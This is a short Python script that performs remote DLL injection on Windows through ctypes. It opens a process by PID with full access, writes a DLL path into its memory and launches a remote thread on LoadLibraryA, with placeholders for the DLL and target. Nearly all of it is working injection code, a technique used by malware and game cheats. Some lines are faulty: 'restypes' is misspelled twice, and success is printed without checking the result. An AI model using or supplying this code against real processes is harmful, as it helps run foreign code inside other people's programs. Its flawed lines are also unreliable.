## Remote DLL Injection
## By ShowNadda

## Version 0.5
# Global Imports
from ctypes import *
from ctypes import wintypes

## Notes:
## There are typically 3 stages in remote DLL Injection;
## 1: Allocate Memory in Remote Process
## 2: Write DLL location in Memory
## 3: The External Process needs to load the DLL using LoadLibrary

# Global Variables and Constants
kernel32 = windll.kernel32
LPCTSTR = c_char_p
SIZE_T = c_size_t

# Creating the Open Process Definition
OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
OpenProcess.restype = wintypes.HANDLE

# Creating the VirtualAllocEx Definition
VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD)
VirtualAllocEx.restype = wintypes.LPVOID

# Creating he WriteProcessMemory Definition
WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T,POINTER(SIZE_T))
WriteProcessMemory.restype = wintypes.BOOL

# Creating the GetModuleHandle Definition
GetModuleHandle = kernel32.GetModuleHandleA
GetModuleHandle.argtypes = (LPCTSTR, )
GetModuleHandle.restype = wintypes.HANDLE

# Creating the GetProcAddress Definition
GetProcAddress = kernel32.GetProcAddress
GetProcAddress.argtypes = (wintypes.HANDLE, LPCTSTR)
GetProcAddress.restypes = wintypes.LPVOID

# Creating "_SECURITY_ATTRIBUTES(Structure)" Class
class _SECURITY_ATTRIBUTES(Structure):
    _fields_ = [('nlength', wintypes.DWORD),
                ('lpSecurityDescriptor', wintypes.LPVOID),
                ('bInheritHandle', wintypes.BOOL),]

SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID

# Creating the CreateRemoteThread Definition
CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD)
CreateRemoteThread.restypes = wintypes.HANDLE

# Constants to work with Memory
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
EXECUTE_IMMEDIATELY = 0x0
PROCESS_ALL_ACCESS = ( 0x000f0000 | 0x00100000 | 0x00000FFF)

# DLL to Inject
dll = b"" # DLL Path Here, use double \\'s instead of singular. Example: c:\\example\\example.dll

# Process to Inject into
pid = 7452 # PID Value to use, look up via Task Manager, etc

# Open a handle to process
handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
if not handle:
    raise WinError()
print("[?] Handle obtained => {0:X}".format(handle))

# Create Memory in Remote Process
remote_memory = VirtualAllocEx(handle, False, len(dll) +1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
if not remote_memory:
    raise WinError()
print("[?] Memory allocated =>", hex(remote_memory))

# Write Memory in Remote Process
write = WriteProcessMemory(handle, remote_memory, dll, len(dll) +1, None)
if not write:
    raise WinError()
print("[?] Bytes written in Remote Process => {}".format(dll))

# Start a new thread to load DLL
load_lib = GetProcAddress(GetModuleHandle(b"kernel32.dll"), b"LoadLibraryA")
print("[?] LoadLibrary Address is => ", hex(load_lib))

# Start Remote Thread                Security Attributes, Initial Size of Stack to Allocate, Start Address to be executed by the thread, the LP parameter, the variable to be passed to the LP function, Creation Flags, The Pointer that receives the thread Identifier
rthread = CreateRemoteThread(handle, None, 0, load_lib, remote_memory, EXECUTE_IMMEDIATELY, None)
print("[!] DLL Injection Successful!")
# You will only be able to target a process once with LoadLibrary, so if you need to re-inject, use a new Target Process
